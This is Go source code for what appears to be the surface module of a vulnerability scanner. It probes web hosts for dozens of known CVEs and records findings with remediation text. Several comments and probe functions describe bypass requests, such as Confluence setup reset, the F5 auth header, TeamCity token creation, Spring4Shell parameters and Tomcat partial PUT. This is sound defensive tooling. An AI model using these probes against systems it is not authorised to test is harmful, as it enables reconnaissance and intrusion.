			"DjVu files to ExifTool without authentication. ExifTool versions < 12.38 execute shell commands " +
			"embedded in DjVu metadata, giving remote code execution. GitLab < 13.10.3, < 13.9.6, < 13.8.8 " +
			"are vulnerable. Upgrade GitLab and restrict API access.",
	},

	// CVE-2021-27101/27102/27103/27104 — Accellion File Transfer Appliance (FTA) exploited (CVSS 9.8, KEV).
	// Accellion FTA is end-of-life (discontinued Jan 2021). The product was mass-exploited by
	// UNC2546/FIN11 for data extortion. Any internet-facing FTA is almost certainly compromised.
	{
		path:         "/courier/web/1000@/wmLogin.html",
		title:        "CVE-2021-27101/27104: Accellion FTA (end-of-life) exposed — likely compromised",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEAccellionFTA,
		bodyContains: "Accellion",
		description: "An Accellion File Transfer Appliance (FTA) is internet-accessible. FTA reached end-of-life " +
			"in April 2021 and receives no security patches. CVE-2021-27101 through 27104 (CVSS 9.8, KEV) are SQL " +
			"injection and OS command injection vulnerabilities exploited by UNC2546/FIN11 for data extortion " +
			"against dozens of organisations including government agencies. This appliance is almost certainly " +
			"compromised. Decommission immediately and engage incident response.",
	},

	// ── 2020 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2020-5902 — F5 BIG-IP TMUI RCE via path traversal (CVSS 9.8, KEV).
	// /tmui/login.jsp fingerprints the Traffic Management User Interface.
	// The exploit traverses from /tmui/login.jsp/../.. to reach /mgmt/tm/ endpoints.
	{
		path:         "/tmui/login.jsp",
		title:        "CVE-2020-5902: F5 BIG-IP TMUI management interface exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEF5BigIPTMUI,
		bodyContains: "F5",
		description: "The F5 BIG-IP Traffic Management User Interface (TMUI) is internet-accessible. " +
			"CVE-2020-5902 (CVSS 9.8, KEV) exploits a path traversal in the TMUI that allows " +
			"unauthenticated execution of arbitrary system commands on the BIG-IP controller. " +
			"This vulnerability was mass-exploited within days of disclosure. " +
			"Apply F5 patches immediately and restrict TMUI access to internal management networks.",
	},

	// CVE-2020-10148 — SolarWinds Orion auth bypass (CVSS 9.8, KEV).
	// /Orion/Login.aspx fingerprints the SolarWinds Orion Platform.
	// This CVE was exploited in the SUNBURST supply chain attack campaign context.
	{
		path:         "/Orion/Login.aspx",
		title:        "CVE-2020-10148: SolarWinds Orion Platform exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVESolarWindsOrion,
		bodyContains: "SolarWinds",
		description: "The SolarWinds Orion Platform is internet-accessible. " +
			"CVE-2020-10148 (CVSS 9.8, KEV) is an authentication bypass in the Orion API that allows " +
			"unauthenticated access to the Orion web application when a request includes the parameter " +
			"'SolarWinds-Orion-API-UseSolarWindsAuthentication=false'. This was exploited in the context " +
			"of the SUNBURST supply chain compromise campaign. Upgrade to Orion 2020.2.1 HF 2 or later.",
	},

	// CVE-2020-13942 — Apache Unomi RCE via MVEL/OGNL in context.json (CVSS 9.8, KEV).
	// /context.json returns profile data without auth; the payload RCE is via MVEL expressions.
	{
		path:         "/context.json",
		title:        "CVE-2020-13942: Apache Unomi context API exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEApacheUnomi,
		bodyContains: "requiredProfileId",
		description: "The Apache Unomi Customer Data Platform /context.json endpoint is internet-accessible. " +
			"CVE-2020-13942 (CVSS 9.8, KEV) allows unauthenticated remote code execution by sending " +
			"MVEL or OGNL expressions as profile property conditions — the server evaluates them as code. " +
			"Apache Unomi is a customer data hub; exploitation exposes all customer profiles. " +
			"Upgrade to Unomi 1.5.2 or later immediately.",
	},

	// CVE-2020-7961 — Liferay Portal Java deserialization via /api/jsonws (CVSS 9.8, KEV).
	// The JSON Web Services API is publicly accessible without authentication by default.
	{
		path:         "/api/jsonws",
		title:        "CVE-2020-7961: Liferay Portal JSON Web Services API exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVELiferayRCE,
		bodyContains: "jsonws",
		description: "The Liferay Portal JSON Web Services API (/api/jsonws) is internet-accessible. " +
			"CVE-2020-7961 (CVSS 9.8, KEV) exploits a Java deserialization vulnerability in Liferay's " +
			"JSONWS API — an unauthenticated POST with a crafted serialized payload triggers RCE on the server. " +
			"Liferay Portal 6.1+, 6.2+, 7.0, 7.1, 7.2 before the patch are affected. " +
			"Upgrade to Liferay 7.2 CE GA2+ or DXP with the security patch applied.",
	},

	// CVE-2020-15505 — MobileIron MDM RCE (CVSS 9.8, KEV).
	// /mifs/user/login.jsp fingerprints MobileIron Core/Enterprise/Sentry MDM.
	{
		path:         "/mifs/user/login.jsp",
		title:        "CVE-2020-15505: MobileIron MDM login exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEMobileIronRCE,
		bodyContains: "MobileIron",
		description: "MobileIron Mobile Device Management (MDM) is internet-accessible. " +
			"CVE-2020-15505 (CVSS 9.8, KEV) is an unauthenticated remote code execution vulnerability " +
			"in MobileIron Core and Connector before 10.6. Nation-state actors exploited this to gain " +
			"initial access to government and healthcare networks. " +
			"Upgrade MobileIron Core to 10.6 or later and restrict MDM management access.",
	},

	// CVE-2020-10189 — ManageEngine Desktop Central pre-auth file upload → RCE (CVSS 9.8, KEV).
	// /configurations.do fingerprints ManageEngine Desktop Central. Exploited by APT41 within hours
	// of CVE disclosure in March 2020 to backdoor targets in the healthcare and defense sectors.
	{
		path:         "/configurations.do",
		title:        "CVE-2020-10189: ManageEngine Desktop Central management interface exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEManageEngineDesktopCVE,
		bodyContains: "ManageEngine",
		description: "ManageEngine Desktop Central (enterprise endpoint management) is internet-accessible. " +
			"CVE-2020-10189 (CVSS 9.8, KEV) is an unauthenticated file upload vulnerability allowing RCE in " +
			"Desktop Central build 10.0.473 and earlier. APT41 exploited this within 5 hours of CVE disclosure. " +
			"Upgrade to build 10.0.479 or later and restrict management access to internal networks.",
	},

	// CVE-2019-17558 — Apache Solr SSTI RCE via Velocity template (CVSS 9.8, KEV).
	// /solr/admin/info/system is accessible without authentication in default deployments.
	// Solr 5.0.0–8.3.1 allows enabling the Velocity template parser via the admin API,
	// which is then exploitable for server-side template injection → RCE.
	{
		path:         "/solr/admin/info/system",
		title:        "CVE-2019-17558: Apache Solr admin API unauthenticated — SSTI/RCE exposure",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVESolrAdminExposed,
		bodyContains: "solr",
		description: "The Apache Solr admin API at /solr/admin/info/system is internet-accessible without " +
			"authentication. CVE-2019-17558 (CVSS 9.8, KEV) allows an attacker to enable the Velocity " +
			"template query parser via the admin API and achieve unauthenticated RCE. An open Solr admin " +
			"API also exposes all indexed data, core configurations, and JVM environment. " +
			"Restrict Solr admin access to localhost/management networks and upgrade to Solr ≥ 8.3.1.",
	},

	// CVE-2016-4047 — Open-Xchange AppSuite SSRF via unvalidated proxy URL parameter (CVSS 8.8).
	// /api/system/version returns JSON version without authentication on default deployments.
	// CVE-2016-4047 allows an authenticated OX user to send server-side requests to internal
	// services via the proxy API. Fingerprinting the version enables CVE-specific triage.
	{
		path:         "/api/system/version",
		title:        "CVE-2016-4047: Open-Xchange AppSuite version API exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEOXAppSuiteSSRF,
		bodyContains: "version",
		description: "The Open-Xchange AppSuite server-side version API is internet-accessible without authentication. " +
			"CVE-2016-4047 (CVSS 8.8) is an SSRF vulnerability in the OX AppSuite frontend proxy that allows " +
			"authenticated users to reach internal services. Versions before 7.8.0-rev27 are vulnerable. " +
			"Restrict the admin and API endpoints to internal networks and upgrade OX AppSuite.",
	},

	// CVE-2017-0929 — DotNetNuke (DNN) DnnImageHandler path traversal → machineKey leak → RCE (CVSS 9.8).
	// /DnnImageHandler.ashx is specific to DNN and is accessible without authentication.
	// Path traversal via the `file` parameter leaks web.config, exposing the machineKey used to
	// forge ViewState and cookie deserialization payloads (CVE-2017-9822).
	{
		path:         "/DnnImageHandler.ashx",
		title:        "CVE-2017-0929: DotNetNuke DnnImageHandler endpoint exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEDotNetNukeTraversal,
		bodyContains: "DotNetNuke",
		description: "The DotNetNuke (DNN) image handler endpoint (/DnnImageHandler.ashx) is internet-accessible. " +
			"CVE-2017-0929 (CVSS 9.8) allows path traversal via the `file` parameter to read arbitrary files " +
			"from the web server, including web.config. The machineKey in web.config can then be used to forge " +
			"signed .NET ViewState and cookie payloads, enabling CVE-2017-9822 (deserialization RCE via the " +
			"DNNPersonalization cookie). Upgrade DNN and remove or restrict the image handler endpoint.",
	},

	// CVE-2017-1000486 — Primefaces EL injection via hardcoded/predictable secret key (CVSS 9.8).
	// /javax.faces.resource/dynamiccontent.properties.xhtml is the Primefaces ResourceServlet path.
	// The endpoint decrypts the `ln` parameter with a hardcoded default key (DES/AES) and evaluates
	// the result as an EL expression — any Primefaces instance with default keys is vulnerable.
	{
		path:         "/javax.faces.resource/dynamiccontent.properties.xhtml",
		title:        "CVE-2017-1000486: Primefaces ResourceServlet EL injection endpoint exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEPrimefacesEL,
		description: "The Primefaces JSF component framework ResourceServlet endpoint is internet-accessible. " +
			"CVE-2017-1000486 (CVSS 9.8) exploits the Primefaces dynamic resource endpoint by supplying an " +
			"encrypted EL expression (forged using the hardcoded default key) that is evaluated server-side, " +
			"leading to unauthenticated remote code execution. Primefaces versions before 5.1.14, 5.2.21, " +
			"5.3.8, and 6.0.2 use the default key 'primefaces'. Set a strong secret key in web.xml and " +
			"upgrade Primefaces to a patched version.",
	},

	// CVE-2016-5983 — IBM WebSphere Application Server admin console deserialization RCE (CVSS 9.8).
	// /ibm/console/login.do fingerprints the WebSphere admin console. Even without CVE-2016-5983,
	// an internet-facing WebSphere admin console is a critical misconfiguration.
	{
		path:         "/ibm/console/login.do",
		title:        "CVE-2016-5983: IBM WebSphere admin console internet-exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVEWebSphereConsole,
		bodyContains: "WebSphere",
		description: "The IBM WebSphere Application Server admin console at /ibm/console/ is internet-accessible. " +
			"CVE-2016-5983 (CVSS 9.8) allows an authenticated user to execute arbitrary OS commands via the " +
			"WebSphere admin console script interface. Exposure of the admin console to the internet is a " +
			"critical misconfiguration regardless of patch level. " +
			"Restrict WebSphere admin console access to management networks only.",
	},

	// CVE-2015-8562 — Joomla PHP object injection via HTTP User-Agent → RCE (CVSS 9.8, KEV).
	// /administrator/manifests/files/joomla.xml exposes the installed Joomla version without auth.
	// Joomla 1.5–3.4.5 deserializes untrusted User-Agent/X-Forwarded-For headers — unauth RCE.
	// CVE-2015-7857 (SQL injection in com_contenthistory) affects Joomla 2.5.x–3.4.4.
	{
		path:         "/administrator/manifests/files/joomla.xml",
		title:        "CVE-2015-8562/7857: Joomla version manifest exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEJoomlaObjectInjection,
		bodyContains: "files_joomla",
		description: "The Joomla CMS version manifest is publicly accessible at " +
			"/administrator/manifests/files/joomla.xml. This XML file discloses the exact Joomla version. " +
			"CVE-2015-8562 (CVSS 9.8, KEV) — PHP object injection via User-Agent header — affects Joomla 1.5–3.4.5. " +
			"CVE-2015-7857 (SQL injection via com_contenthistory) affects Joomla 2.5.x–3.4.4. " +
			"Compare the disclosed version and patch immediately. Restrict /administrator/ access to trusted IPs.",
	},

	// CVE-2019-16920 — D-Link HNAP unauthenticated command injection (CVSS 9.8).
	// GET /HNAP1/ returns the list of supported HNAP actions without authentication.
	// D-Link DIR-655, DIR-806, DIR-859, and related SOHO routers expose the HNAP API;
	// the GetDeviceSettings/SetNetworkSettings actions allow command injection without auth.
	{
		path:         "/HNAP1/",
		title:        "CVE-2019-16920: D-Link HNAP API exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEDLinkHNAP,
		bodyContains: "GetDeviceSettings",
		description: "A D-Link router HNAP (Home Network Administration Protocol) API is internet-accessible " +
			"at /HNAP1/ without authentication. CVE-2019-16920 (CVSS 9.8) allows an unauthenticated attacker " +
			"to inject OS commands via the GetDeviceSettings and SetNetworkSettings SOAP actions. " +
			"Affected models include D-Link DIR-655, DIR-806, DIR-859, and others running firmware prior to October 2019. " +
			"Disable remote management and apply firmware updates from D-Link immediately.",
	},
}

// Scanner actively probes for exposed sensitive files.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scheme := detectScheme(ctx, client, asset)
	base := scheme + "://" + asset

	// Wildcard / catch-all detection: probe a path that cannot exist on any
	// real application. If the server returns 200, it serves the same response
	// for every path (install script CDNs, catch-all SPA configs, etc.) and
	// all path-based findings would be false positives.
	if isCatchAll(ctx, client, base) {
		return nil, nil
	}

	var findings []finding.Finding

	for _, t := range targets {
		if t.deepOnly && scanType != module.ScanDeep {
			continue
		}

		u := base + t.path
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		// Confirm it's a real file, not a soft 404 or CMS catch-all.
		if t.bodyContains != "" && !strings.Contains(string(body), t.bodyContains) {
			continue
		}

		// Heuristic: if the body is an HTML page, it's almost certainly a soft 404.
		ct := resp.Header.Get("Content-Type")
		if strings.Contains(ct, "text/html") && t.bodyContains == "" {
			continue
		}

		// Store up to 2000 chars so the AI enrichment pipeline and DLP scanner
		// can see actual key/value pairs (most .env files fit in this window).
		snippet := string(body)
		if len(snippet) > 2000 {
			snippet = snippet[:2000] + "…"
		}

		checkID := finding.CheckExposureSensitiveFile
		if t.checkID != "" {
			checkID = t.checkID
		}
		desc := t.description
		if desc == "" {
			desc = fmt.Sprintf(
				"%s is publicly accessible at %s. This file may contain credentials, "+
					"secrets, or configuration data that enables further attacks.",
				t.path, u)
		}

		findings = append(findings, finding.Finding{
			CheckID:      checkID,
			Module:       "surface",
			Scanner:      scannerName,
			Severity:     t.severity,
			Title:        t.title,
			Description:  desc,
			Asset:        asset,
			ProofCommand: fmt.Sprintf("curl -s %s | head -50", u),
			Evidence: map[string]any{
				"url":     u,
				"path":    t.path,
				"snippet": snippet,
			},
		})
	}

	// CVE-2024-27198 (TeamCity auth bypass, CVSS 9.8, KEV):
	// GET /app/rest/server;.ico bypasses Spring Security filter chain on
	// TeamCity < 2023.11.4 and returns server XML with version information.
	// CVE-2024-27198 + CVE-2024-27199 (TeamCity auth bypass variants):
	findings = append(findings, probeTeamCityAuthBypass(ctx, client, base, asset)...)

	// CVE-2024-21762 / CVE-2018-13379 (FortiOS SSL VPN):
	// GET /remote/info returns JSON with version on FortiOS when SSL VPN is
	// enabled. Depending on version, emits CVE-2024-21762 (pre-auth RCE, CVSS
	// 9.6) and/or CVE-2018-13379 (arbitrary credential file read, CVSS 9.8).
	findings = append(findings, probeFortiOSSSLVPNVersion(ctx, client, base, asset)...)

	// CVE-2024-4577 (PHP CGI arg injection, CVSS 9.8, KEV):
	// GET /?-v on a Windows IIS + PHP-CGI server returns PHP version output.
	// Any version < 8.1.29 / 8.2.20 / 8.3.8 is vulnerable.
	if f := probePHPCGIVersion(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-22515 (Confluence setup bypass, CVSS 10.0, KEV):
	// GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
	// returns 200 on vulnerable Confluence 8.0–8.5.1, enabling unauthenticated admin creation.
	if f := probeConfluenceSetup(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-22518 (Confluence restore bypass, CVSS 10.0, KEV):
	// GET /json/setup-restore.action returns 200 on unpatched Confluence, allowing
	// unauthenticated database restore which overwrites credentials.
	if f := probeConfluenceRestore(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-20198 (Cisco IOS XE BadCandy implant, CVSS 10.0, KEV):
	// POST /webui/logoutconfirm.html?logon_hash=1 returns an 18-byte hex string
	// if the BadCandy Lua implant is installed. Uncompromised devices return 404.
	if f := probeCiscoIOSXEImplant(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-46805 + CVE-2024-21887 (Ivanti Connect Secure):
	// Auth bypass (CVSS 8.2) + command injection (CVSS 9.1) — chained to pre-auth RCE.
	findings = append(findings, probeIvantiConnectSecure(ctx, client, base, asset)...)

	// CVE-2023-4966 (Citrix Bleed, CVSS 9.4, KEV):
	// GET /oauth/idp/.well-known/openid-configuration on a NetScaler Gateway confirms
	// the OIDC endpoint is exposed — the overlong-Host memory-leak attack targets this path.
	if f := probeCitrixBleed(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-1388 (F5 BIG-IP iControl REST auth bypass, CVSS 9.8, KEV):
	// GET /mgmt/shared/echo with X-F5-Auth-Token bypass header returns JSON on vulnerable BIG-IP.
	if f := probeF5BigIPAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-26134 (Confluence OGNL injection, CVSS 9.8, KEV):
	// GET /login.action fingerprints Confluence. Older Confluence (< 7.18.1 / 7.4.17)
	// is vulnerable to unauthenticated OGNL injection via HTTP URI path segments.
	if f := probeConfluenceOGNL(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-40684 (FortiOS/FortiProxy auth bypass, CVSS 9.8, KEV):
	// GET /api/v2/cmdb/system/admin with crafted Forwarded header bypasses auth on
	// FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1; FortiProxy 7.0.0–7.0.6, 7.2.0.
	if f := probeFortiOSAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2019-11510 (Pulse Secure VPN arbitrary file read, CVSS 10.0, KEV):
	// /dana-na/auth/url_default/welcome.cgi fingerprints Pulse Secure; version from login page JS paths.
	if f := probePulseSecureVPN(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2019-1579 (PAN-OS GlobalProtect pre-auth RCE, CVSS 9.8, KEV):
	// /global-protect/prelogin.esp returns XML with <panos-version> on unpatched PAN-OS.
	findings = append(findings, probePANGlobalProtect(ctx, client, base, asset)...)

	// CVE-2019-11580 (Atlassian Crowd pdkinstall pre-auth RCE, CVSS 9.8, KEV):
	// GET /crowd/plugins/servlet/pdkinstall returning 200 with upload form = pre-auth plugin install exposed.
	if f := probeCrowdPdkInstall(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2019-18935 (Telerik RadAsyncUpload .NET deserialization, CVSS 9.8, KEV):
	// GET /Telerik.Web.UI.WebResource.axd?type=rau returning 200/400/500 with Telerik content = endpoint present.
	if f := probeTelerikRAU(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2019-2725 (Oracle WebLogic /_async/ pre-auth deserialization RCE, CVSS 9.8, KEV):
	// GET /_async/AsyncResponseService?WSDL returning WSDL XML = the vulnerable endpoint is exposed.
	if f := probeWebLogicAsync(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2018-7600/7602 (Drupal Drupalgeddon2/3, CVSS 9.8, KEV):
	// CHANGELOG.txt reveals Drupal version; 8.x < 8.5.1 / 7.x < 7.58 are vulnerable.
	if f := probeDrupalgeddon(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2017-10271 (Oracle WebLogic wls-wsat XXE → RCE, CVSS 9.8, KEV):
	// GET /wls-wsat/CoordinatorPortType returning 200 with WLS content = pre-auth deserialization path exposed.
	if f := probeWebLogicWLSWSAT(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2017-7921 (Hikvision IP camera unauthenticated ISAPI, CVSS 9.8, KEV):
	// GET /ISAPI/Security/sessionLogin/capabilities returning XML without auth = ISAPI unauthenticated.
	if f := probeHikvisionISAPI(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2016-4977 (Spring Security OAuth2 SpEL injection, CVSS 9.8):
	// GET /oauth/authorize without credentials → Spring OAuth error page with Whitelabel format
	// or JSON error response confirms the OAuth2 endpoint is exposed.
	if f := probeSpringOAuthSpEL(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2016-4437 (Apache Shiro remember-me deserialization, CVSS 9.8, KEV):
	// GET with Cookie: rememberMe=garbage → Set-Cookie: rememberMe=deleteMe = Shiro detected.
	if f := probeShiroRememberMe(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2015-7501 (JBoss JMXInvokerServlet pre-auth Java deserialization, CVSS 9.8, KEV):
	// GET /invoker/JMXInvokerServlet returning 200 with Java serialized binary body = vulnerable endpoint exposed.
	if f := probeJBossJMXInvoker(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2015-1635 (MS15-034, IIS HTTP.sys Range header integer overflow, CVSS 10.0, KEV):
	// GET / with Range: bytes=6000-18446744073709551615 → 416 from Microsoft-IIS = vulnerable HTTP.sys.
	// Patched IIS returns 400 Bad Request for the overflowed UINT64_MAX range value.
	if f := probeIISHTTPSysRange(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-29357 (SharePoint Server 2019 JWT none-alg auth bypass, CVSS 9.8, KEV):
	// MicrosoftSharePointTeamServices header from /_api/contextinfo reveals build version;
	// < 16.0.10399 means the June 2023 CU is not applied and the JWT bypass is unpatched.
	if f := probeSharePointJWT(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2021-26855 (Exchange ProxyLogon, CVSS 9.8, KEV) / CVE-2021-34473/34523/31207 (ProxyShell):
	// X-OWA-Version header at /owa/ reveals Exchange version; pre-March and pre-July 2021 CUs are vulnerable.
	if f := probeExchangeOWAVersion(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2021-41773/42013 (Apache httpd 2.4.49–2.4.50 path traversal/RCE, CVSS 9.8, KEV):
	// Server header exposes exact Apache version; only 2.4.49 and 2.4.50 are vulnerable.
	if f := probeApacheHTTPVersion(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2020-14882/14883 (Oracle WebLogic admin console auth bypass/RCE, CVSS 9.8, KEV):
	// /console/login/LoginForm.jsp fingerprints WebLogic; double-encoded path confirms bypass.
	if f := probeWebLogicConsole(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2019-19781/2020-8196 (Citrix ADC Nitro API unauthenticated access, CVSS 9.8, KEV):
	// GET /nitro/v1/config/nsversion without credentials confirms unauthenticated Nitro API exposure.
	// CVE-2023-3519 (CVSS 9.8, KEV): same endpoint reveals version — emit RCE finding if vulnerable.
	findings = append(findings, probeCitrixADCNitro(ctx, client, base, asset)...)

	// CVE-2022-22965 (Spring4Shell, CVSS 9.8, KEV):
	// GET /?class.module.classLoader.URLs[0]=0 → 400 from Spring MVC with classLoader binding
	// confirms the vulnerable pattern; 400 from unrelated causes is disambiguated by body.
	if f := probeSpring4Shell(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-37042 (Zimbra mboximport auth bypass, CVSS 9.8, KEV):
	// GET /service/extension/backup/mboximport → 500 (not 401/403) confirms the endpoint
	// is reachable without authentication, indicating unpatched Zimbra.
	if f := probeZimbraAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-42793 (TeamCity /RPC2 bypass, CVSS 9.8, KEV, Deep only):
	// POST /app/rest/users/id:1/tokens/RPC2 bypasses auth on TeamCity < 2023.05.4
	// and returns an admin API token — distinct from CVE-2024-27198's path confusion.
	if scanType == module.ScanDeep {
		if f := probeTeamCityRPC2(ctx, client, base, asset); f != nil {
			findings = append(findings, *f)
		}
	}

	// CVE-2025-24813 (Deep only): Apache Tomcat partial PUT to .session path.
	// If Tomcat's DefaultServlet has partial PUT enabled (default in affected
	// versions) an attacker can upload an arbitrary file via Content-Range PUT,
	// then trigger deserialization by requesting the session ID that matches the
	// uploaded filename. The probe is a 1-byte partial PUT to a random .session
	// path — acceptance (201 Created) proves the vulnerability without exploiting it.
	if scanType == module.ScanDeep {
		if f := probeTomcatPartialPUT(ctx, client, base, asset); f != nil {
			findings = append(findings, *f)
		}
	}

	// CVE-2023-2868 (Barracuda ESG pre-auth RCE, CVSS 9.8, KEV):
	// Login page fingerprint on /cgi-mod/index.cgi confirms Barracuda ESG exposure.
	if f := probeBarracudaESG(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-32315 (Openfire path-traversal auth bypass, CVSS 9.8, KEV):
	// /login.jsp fingerprints Openfire; setup path traversal confirms unpatched < 4.7.5.
	if f := probeOpenfire(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-20269 (Cisco ASA/FTD SSL VPN brute-force / unauthorized session, CVSS 9.1, KEV):
	// /+CSCOE+/logon.html presence confirms Cisco ASA SSL VPN is internet-exposed.
	if f := probeCiscoASASSLVPN(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-43770 (Roundcube stored XSS → victim RCE, CVSS 6.1):
	// / meta generator reveals Roundcube version; < 1.4.14/1.5.4/1.6.3 are vulnerable.
	if f := probeRoundcube(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-21587 (Oracle E-Business Suite RF.jsp arbitrary file read, CVSS 9.8, KEV):
	// /OA_HTML/RF.jsp 200 response confirms EBS is internet-exposed and the vulnerable
	// endpoint is reachable without authentication.
	if f := probeOracleEBS(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2021-40539 (ManageEngine ADSelfService Plus REST API auth bypass → RCE, CVSS 9.8, KEV):
	// /LoginAction.do with ADSelfService content fingerprints an exposed instance.
	if f := probeManageEngineADSelfService(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2021-20028 (SonicWall SMA 100/200/400/500v pre-auth SQL injection, CVSS 9.8, KEV):
	// /cgi-bin/welcome with SonicWall content fingerprints an exposed SMA appliance.
	if f := probeSonicWallSMA(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2020-17496 (vBulletin 5.x widget PHP eval → unauthenticated RCE, CVSS 9.8, KEV):
	// meta generator on / reveals vBulletin version; 5.5.4–5.6.2 are vulnerable.
	if f := probevBulletin5x(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2018-15961 (Adobe ColdFusion FCKEditor file upload → RCE, CVSS 9.8, KEV):
	// /CFIDE/scripts/ajax/FCKeditor/.../upload.cfm 200/500 response confirms
	// the unrestricted file upload endpoint is reachable without authentication.
	if f := probeColdFusionFCKEditor(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// Harbor container registry (CVE-2026-4404 default credentials, CVE-2022-46463 access control):
	// /api/v2.0/systeminfo exposes harbor_version unauthenticated.
	findings = append(findings, probeHarbor(ctx, client, base, asset)...)

	// Argo CD GitOps platform (CVE-2025-55190 CVSS 10.0 repo credential leak):
	// /api/version exposes Argo CD version unauthenticated.
	if f := probeArgoCD(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2021-43798 (Grafana < 8.3.0 plugin path traversal, CVSS 7.5, KEV):
	// /api/health exposes version; < 8.3.0 vulnerable to arbitrary file read.
	if f := probeGrafanaPathTraversal(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2024-36466/36467 (Zabbix session forgery + API auth bypass, CVSS 9.9):
	// JSON-RPC apiinfo.version call (unauthenticated by Zabbix design).
	if f := probeZabbixSessionForge(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2024-3116 (pgAdmin ≤ 8.4 validate binary path RCE, EPSS 90.7%):
	// /misc/ping or page source exposes pgAdmin version.
	if f := probePgAdminValidateRCE(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-30781 (Gitea < 1.16.7 shell command injection, CVSS 9.8):
	// /api/v1/version exposes Gitea version unauthenticated.
	if f := probeGiteaCMDInjection(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2024-21591 (Juniper J-Web < 23.4R1 type confusion → pre-auth RCE as root, CVSS 9.8, KEV):
	// Re-probe /webauth_operation.php to emit companion finding alongside CVE-2023-36844.
	if f := probeJuniperJWeb2024(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// Apache Airflow exposure + CVE-2024-39877 (DAG code execution, CVSS 8.8):
	// /api/v1/health confirms Airflow; /api/v1/version reveals version < 2.10.0.
	findings = append(findings, probeApacheAirflow(ctx, client, base, asset)...)

	// Open WebUI exposure (CVE-2024-1520 OS command injection via /open_code_folder):
	// GET / and check for "Open WebUI" in page title.
	if f := probeOpenWebUI(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	return findings, nil
}

// isCatchAll returns true when the server responds with 200 to a randomly
// named path that cannot exist on any real application. This detects install
// script CDNs, SPA catch-alls, and wildcard configs where every path returns
// the same content — path-based findings would all be false positives.
func isCatchAll(ctx context.Context, client *http.Client, base string) bool {
	u := base + "/beacon-probe-c4a7f2d9b3e1-doesnotexist"
